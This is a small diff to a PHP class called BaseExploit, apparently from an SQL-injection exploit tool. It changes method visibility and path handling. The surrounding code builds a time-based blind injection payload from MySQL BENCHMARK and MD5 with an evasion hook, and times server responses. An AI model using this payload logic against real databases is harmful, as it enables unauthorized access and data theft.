@@ -41,11 +41,11 @@ abstract class BaseExploit
 		return "BENCHMARK(".self::$benchmark.",{$this->evasion()}MD5({$this->signatureMysql()}))";
 	}
 	private $timer=null;
-	protected function timein()
+	function timein()
 	{
 		$this->timer=microtime(true);
 	}
-	protected function timeout()
+	function timeout()
 	{
 		return microtime(true)-$this->timer;
 	}
@@ -100,7 +100,7 @@ abstract class BaseExploit
 	static $path;
 	function path()
 	{
-		return self::$path;
+		return realpath(self::$path)."/";
 	}
 	function url()
 	{
